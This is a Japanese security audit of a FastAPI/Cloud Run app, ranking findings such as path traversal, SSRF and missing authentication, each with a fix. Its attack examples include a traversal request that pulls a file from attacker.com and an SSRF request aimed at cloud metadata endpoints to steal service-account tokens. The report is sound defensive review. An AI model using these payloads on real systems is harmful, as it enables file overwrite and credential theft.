# Security Auditor レビュー結果

**審査日**: 2026-03-08
**審査対象**: Shopee Optimizer (FastAPI + Cloud Run) -- PR #19〜#22 差分レビュー
**審査担当**: シニアセキュリティエンジニア (CISSP / 経験10年)
**審査ファイル**: app.py / shopee_core.py

> 攻撃者はここをどう悪用する? 最小権限の原則は守られている?

---

## Critical（即時対応必須）

### CRITICAL-1: /regenerate-video と /add-images でASINが未検証のままパスを構築する（パストラバーサル）

PR#21・PR#22 で `batch_id` 消失時のフォールバック実装が追加されたが、
その際に `asin` パラメータのバリデーションが追加されていない。

**脆弱コード (app.py:3030, 3044 / 3264, 3271):**

`/regenerate-video` (L3030):
```python
asin = data.get("asin", "")           # バリデーションなし
output_dir = config["output_base"] / asin   # ../../../etc 等を受け入れる
```

`/add-images` (L3264):
```python
asin = data.get("asin", "")           # バリデーションなし
output_dir = config["output_base"] / asin
```

一方 `/files/{asin}/{path:path}` (L2018) では正しく検証している:
```python
if not re.match(r'^[A-Z0-9]{10}$', asin):
    raise HTTPException(status_code=400, detail="Invalid ASIN format")
```

さらに `images_dir.mkdir(exist_ok=True)` が呼ばれるため、任意パスにディレクトリが自動作成される。

**攻撃シナリオ:**
```json
POST /add-images
{"batch_id": "", "asin": "../../app", "image_urls": ["http://attacker.com/payload.jpg"]}
```
output_base/../../app/images/ に悪性ファイルが書き込まれ、アプリケーションファイルを上書きできる。

**修正方法（コード例）:**
```python
ASIN_PATTERN = re.compile(r'^[A-Z0-9]{10}$')

def validate_asin(asin: str) -> str:
    """ASINフォーマット検証。不正な場合はHTTPExceptionを投げる。"""
    if not ASIN_PATTERN.match(asin):
        raise HTTPException(status_code=400, detail="Invalid ASIN format")
    return asin

# /regenerate-video と /add-images の先頭に追加
asin = validate_asin(data.get("asin", ""))

# resolve後の境界チェックも追加
output_dir = config["output_base"] / asin
if not output_dir.resolve().is_relative_to(config["output_base"].resolve()):
    raise HTTPException(status_code=403, detail="Forbidden")
```

---

### CRITICAL-2: /add-images のimage_urlsにSSRF対策が存在しない

PR#21 で `/add-images` が `batch_id` 消失時もダウンロード実行するよう変更されたが、
ダウンロード先URLに対する検証は依然として実装されていない。

**脆弱コード (shopee_core.py:361-372):**
```python
def download_supplemental_images(image_urls, output_dir, start_index=0):
    for i, url in enumerate(image_urls):
        resp = requests.get(url, headers=HEADERS, timeout=15)  # URLを無検証で使用
```

**攻撃シナリオ (Cloud Run環境):**
```json
POST /add-images
{
  "asin": "B0123456789",
  "image_urls": [
    "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
    "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
  ]
}
```
GCPメタデータサーバーからサービスアカウントトークンが取得され、
レスポンスがファイルとしてローカルに保存される。攻撃者がそのファイルを読み出せば
GCP全リソースへの不正アクセスが成立する。

**修正方法（コード例）:**
```python
import ipaddress
from urllib.parse import urlparse

ALLOWED_SCHEMES = {"http", "https"}
BLOCKED_HOSTNAMES = {
    "metadata.google.internal",
    "metadata.internal",
    "169.254.169.254",
}

def _is_safe_url(url: str) -> bool:
    try:
        parsed = urlparse(url)
        if parsed.scheme not in ALLOWED_SCHEMES:
            return False
        hostname = (parsed.hostname or "").lower()
        if hostname in BLOCKED_HOSTNAMES:
            return False
        try:
            addr = ipaddress.ip_address(hostname)
            if addr.is_private or addr.is_loopback or addr.is_link_local:
                return False
        except ValueError:
            pass  # ドメイン名は許可
        return True
    except Exception:
        return False

def download_supplemental_images(image_urls, output_dir, start_index=0):
    images_dir = Path(output_dir) / "images"
    images_dir.mkdir(exist_ok=True)
    paths = []
    for i, url in enumerate(image_urls):
        if not _is_safe_url(url):
            logger.warning("SSRF対策: ブロックされたURL %s", url)
            continue
        # ... 以降の処理
```

---

## High（早急に対応）

### HIGH-1: 全エンドポイントに認証・認可が未実装

以下のエンドポイントは認証なしで誰でも実行できる:

| エンドポイント | リスク |
|---|---|
| `GET /batches` | 全バッチ情報（商品・ASINリスト）の漏洩 |
| `GET /batch/{batch_id}` | バッチ詳細（商品データ・パス情報）の漏洩 |
| `POST /process-stream` | APIクレジット（Rainforest/OpenAI）の無断消費 |
| `POST /regenerate-video` | 動画生成APIクレジットの無断消費 |
| `POST /finalize` | スプレッドシートへの不正書き込み |
| `POST /api/batch/{id}/pause` | 他人の処理を停止させるDoS |

**修正方法（最小限: API Token認証）:**
```python
import secrets

APP_API_TOKEN = os.environ.get("APP_API_TOKEN", "")

class TokenAuthMiddleware(BaseHTTPMiddleware):
    UNPROTECTED = {"/", "/health"}

    async def dispatch(self, request: Request, call_next):
        if request.url.path in self.UNPROTECTED or not APP_API_TOKEN:
            return await call_next(request)
        token = request.headers.get("X-API-Token", "")
        if not secrets.compare_digest(token.encode(), APP_API_TOKEN.encode()):
            return JSONResponse({"detail": "Unauthorized"}, status_code=401)
        return await call_next(request)

app.add_middleware(TokenAuthMiddleware)
```

注意: Cloud Run の `--no-allow-unauthenticated` + IAM認証が設定済みであれば、
外部からの到達は制限されるが、内部ネットワーク経由の脅威には対処できないため
アプリケーションレベルの認証も必要。

---

### HIGH-2: APIキーをリクエストボディから受け取る設計

PR#19のAPIキーバグ修正で変更されたresume_batchを含め、
`process-stream` では依然としてクライアントがAPIキーを上書きできる。

**脆弱コード (app.py:2075-2076):**
```python
rainforest_key = data.get("rainforest_key", "") or os.environ.get("RAINFOREST_API_KEY", "")
openai_key = data.get("openai_key", "") or os.environ.get("OPENAI_API_KEY", "")
```

攻撃者が任意のAPIキーを送り込むことでプロービング（有効なキーかどうかの確認）が可能。
また本物のキーをJSコードに埋め込む誘発にもなる。

**修正方法:**
```python
# クライアントからのAPIキー受け取りを廃止
rainforest_key = os.environ.get("RAINFOREST_API_KEY", "")
openai_key = os.environ.get("OPENAI_API_KEY", "")
```

---

### HIGH-3: /drive-video/{file_id} で任意のGoogle DriveファイルにアクセスできるIDORリスク

**脆弱コード (app.py:2033-2058):**
フォーマット検証はしているが、そのファイルIDが本アプリで管理しているものかの検証がない。
サービスアカウントがアクセス権を持つ全ドライブファイルが対象になる。

**攻撃シナリオ:**
スプレッドシートIDやGCPキーJSONのドライブファイルIDが既知であれば、
`/drive-video/{file_id}` で取得できる可能性がある。

**修正方法:**
高優先: HIGH-1の認証実装で `/drive-video/` を保護する。
追加対策: アクセス許可するファイルIDをバッチ状態の既知IDに制限する。

---

## Medium（計画的に対応）

### MEDIUM-1: CSP (Content-Security-Policy) と HSTS が未設定

**現状のSecurityHeadersMiddleware (app.py:115-121):**
```python
response.headers["X-Content-Type-Options"] = "nosniff"  # 設定済み
response.headers["X-Frame-Options"] = "DENY"            # 設定済み
response.headers["Referrer-Policy"] = "strict-origin-when-cross-origin"  # 設定済み
# CSP: 未設定
# HSTS: 未設定
```

INDEX_HTML内にインラインJavaScriptが大量に存在するため、厳格なCSPは即座には適用できないが、
まずCSPを追加して外部ソースを制限することは可能。

**修正方法:**
```python
response.headers["Content-Security-Policy"] = (
    "default-src 'self'; "
    "script-src 'self' 'unsafe-inline'; "   # インライン削除後にunsafe-inlineを除去
    "style-src 'self' 'unsafe-inline' https://fonts.googleapis.com; "
    "font-src https://fonts.gstatic.com; "
    "img-src 'self' data: https://lh3.googleusercontent.com https://drive.google.com; "
    "connect-src 'self'; "
    "frame-ancestors 'none';"
)
response.headers["Strict-Transport-Security"] = "max-age=31536000; includeSubDomains"
```

---

### MEDIUM-2: バッチ状態ファイルに機密データが平文保存

**対象コード (app.py:269-277):**
`_batches/{batch_id}.json` に商品データ・ファイルパス等が保存される。
`openai_key` / `rainforest_key` がバッチ辞書に含まれていた場合（HIGH-2と連動）、
それらも平文でファイルシステムに保存される。

**修正方法:**
```python
_SENSITIVE_KEYS = frozenset({"openai_key", "rainforest_key", "api_key"})

def save_batch_state(batch_id: str):
    batch = BATCH_STORE.get(batch_id)
    if not batch:
        return
    safe_batch = {k: v for k, v in batch.items() if k not in _SENSITIVE_KEYS}
    path = batch_state_path(batch_id)
    path.write_text(
        json.dumps(safe_batch, ensure_ascii=False, indent=2),
        encoding="utf-8",
    )
    path.chmod(0o600)
```

---

### MEDIUM-3: ファイルシステム復元時に拡張子フィルタリングがない

PR#21・PR#22 で追加されたフォールバック処理で `images_dir.glob("*")` が呼ばれ、
画像以外のファイルも `generate_video()` や動画生成処理に渡される可能性がある。

**脆弱コード (app.py:3062-3063):**
```python
product_image_paths = sorted([str(p) for p in images_dir.glob("*")]) if images_dir.exists() else []
```

**修正方法:**
```python
ALLOWED_IMAGE_SUFFIXES = {".jpg", ".jpeg", ".png"}
product_image_paths = sorted([
    str(p) for p in images_dir.glob("*")
    if p.is_file() and p.suffix.lower() in ALLOWED_IMAGE_SUFFIXES
]) if images_dir.exists() else []
```

---

### MEDIUM-4: /api/batch/{batch_id}/pause にDoS脆弱性

`/batches` エンドポイントから全batch_idが一覧取得できるため、
処理中のバッチを外部から停止させることができる。
HIGH-1の認証実装で合わせて解決する。

---

## Low（余裕があれば対応）

### LOW-1: batch_id のパストラバーサルリスク（低影響）

`batch_state_path(batch_id)` は `BATCH_STATE_DIR / f"{batch_id}.json"` を返す。
batch_idは基本的にサーバー側で生成されるため実害は限定的だが、
外部入力から batch_id が到達する箇所（/finalize, /regenerate-video等）で念のため検証が必要。

**修正方法:**
```python
BATCH_ID_PATTERN = re.compile(r'^[A-Za-z0-9_-]{1,100}$')

def get_batch_or_none(batch_id: str):
    if not BATCH_ID_PATTERN.match(batch_id or ""):
        return None
    # ...
```

---

### LOW-2: CORS設定が明示されていない

明示的な `CORSMiddleware` が設定されていない。将来的にフロントエンドを別オリジンに移す際、
ワイルドカード設定が追加されるリスクがある。今のうちにホワイトリストを定義しておくことを推奨。

---

### LOW-3: ログに製品URLが平文記録される

Amazon URLには追跡パラメータが含まれる場合があり、Cloud Loggingへの転送時の
保存期間・閲覧権限を適切に設定すること。パスワード・APIキーがログに混入していないかも定期監査が必要。

---

## 発見した課題一覧（集計）

| # | 課題 | OWASP分類 | 重要度(1-10) | 影響範囲(1-10) | 優先度スコア |
|---|------|----------|------------|--------------|------------|
| 1 | ASIN未検証によるパストラバーサル（/regenerate-video, /add-images） | A01 / A03 | 9 | 9 | 81 |
| 2 | image_urlsのSSRF未対策 | A10 | 8 | 8 | 64 |
| 3 | 全エンドポイントに認証なし | A01 | 8 | 10 | 80 |
| 4 | APIキーをリクエストボディから受け取り可能 | A02 / A04 | 7 | 7 | 49 |
| 5 | /drive-video での任意DriveファイルアクセスIDOR | A01 | 7 | 6 | 42 |
| 6 | CSP / HSTS未設定 | A05 | 6 | 6 | 36 |
| 7 | /pause エンドポイントのDoS | A01 | 6 | 5 | 30 |
| 8 | バッチ状態ファイルへの機密データ平文保存 | A02 | 5 | 5 | 25 |
| 9 | ファイルシステム復元時の拡張子未フィルタ | A04 | 4 | 4 | 16 |
| 10 | batch_id のパストラバーサル（低影響） | A03 | 3 | 3 | 9 |

---

## 評価スコア

| 軸 | スコア | 根拠 |
|---|-------|------|
| セキュリティ（20点満点）| 9 / 20 | 認証が皆無・SSRF未対策・ASIN未検証という3つの根本的欠陥。`SecurityHeadersMiddleware` の実装・`/files/` のパス境界チェック・`effect` のホワイトリスト検証など評価できる点も存在するが、Critical項目が残る |

---

## デプロイ可否判定

- [ ] Critical項目ゼロ → デプロイ可
- [x] Critical項目あり → **修正後に再審査必須**

**現状ではデプロイ推奨できない。**
特に CRITICAL-1（パストラバーサル）と CRITICAL-2（SSRF）は、
ネットワークから到達可能な環境（Cloud Run公開URL等）では即座に悪用可能。

---

## 改善提案まとめ

### 提案1: ASINバリデーションの共通化
- 脆弱性の説明: `/regenerate-video` と `/add-images` でASINを未検証のままパス構築に使用
- 攻撃シナリオ: `"asin": "../../app"` を送信してアプリファイルを上書き
- 修正方法: `validate_asin()` ヘルパー関数をCRITICAL-1のコード例の通り実装し、両エンドポイントの先頭で呼び出す

### 提案2: SSRF対策（URLバリデーション）
- 脆弱性の説明: ユーザー指定URLをバリデーションなしで `requests.get()` に渡す
- 攻撃シナリオ: GCPメタデータサーバーへのリクエストでサービスアカウントトークンを取得
- 修正方法: CRITICAL-2のコード例の通り `_is_safe_url()` を実装する

### 提案3: 認証ミドルウェアの追加
- 脆弱性の説明: 全APIエンドポイントが認証なしでアクセス可能
- 攻撃シナリオ: APIクレジットの無断消費・データ漏洩・DoS
- 修正方法: `APP_API_TOKEN` 環境変数を使ったトークン認証（HIGH-1のコード例）を実装する

---

## 次のPhaseへの引き継ぎ事項

1. **Cloud RunのIAM設定確認が必要**: `--no-allow-unauthenticated` フラグの有無を確認する。設定済みであればHIGH-1の外部脅威は緩和されるが、CRITICAL-2（内部SSRF）は残る
2. **OUTPUT_BASEの永続化方式確認**: GCS等外部ストレージへのマウント有無によってCRITICAL-1・MEDIUM-2の影響範囲が大きく変わる
3. **Serper APIキーの管理**: PR#20でSerper.dev APIに移行しているが、`SERPER_API_KEY` の設定・ローテーション運用ルールを文書化すること
4. **インラインJS削除の計画**: MEDIUM-1のCSP強化に向け、INDEX_HTML内のscriptブロックを外部ファイルに分離することを将来的な計画に含めること
